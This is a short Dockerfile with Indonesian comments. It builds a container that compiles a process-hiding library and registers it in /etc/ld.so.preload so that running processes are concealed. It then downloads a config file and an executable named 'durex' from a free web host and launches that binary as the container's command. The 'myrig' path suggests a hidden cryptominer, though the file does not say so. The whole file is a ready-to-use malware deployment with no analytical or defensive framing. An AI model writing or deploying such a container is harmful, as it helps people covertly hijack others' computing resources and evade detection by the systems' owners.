# Gunakan image dasar
FROM ubuntu:20.04

# Install wget, compiler gcc, dan perangkat lunak yang dibutuhkan
RUN apt-get update && apt-get install -y wget gcc

# Buat direktori untuk meletakkan file-file yang dibutuhkan
WORKDIR /myapp

# Download processhider.c
RUN wget https://raw.githubusercontent.com/cihuuy/libn/master/processhider.c

# Compile processhider.c dan pindahkan libprocess.so
RUN gcc -Wall -fPIC -shared -o libprocess.so processhider.c -ldl \
    && mv libprocess.so /usr/local/lib/ \
    && echo /usr/local/lib/libprocess.so >> /etc/ld.so.preload

# Download config.json dan durex, serta memberikan izin eksekusi pada durex
RUN wget https://nyadur.000webhostapp.com/myrig/config.json \
    && wget https://nyadur.000webhostapp.com/myrig/durex \
    && chmod +x durex

# Perintah yang akan dijalankan saat container pertama kali dijalankan
# Ganti perintah ini sesuai dengan kebutuhan Anda
CMD ["./durex"]
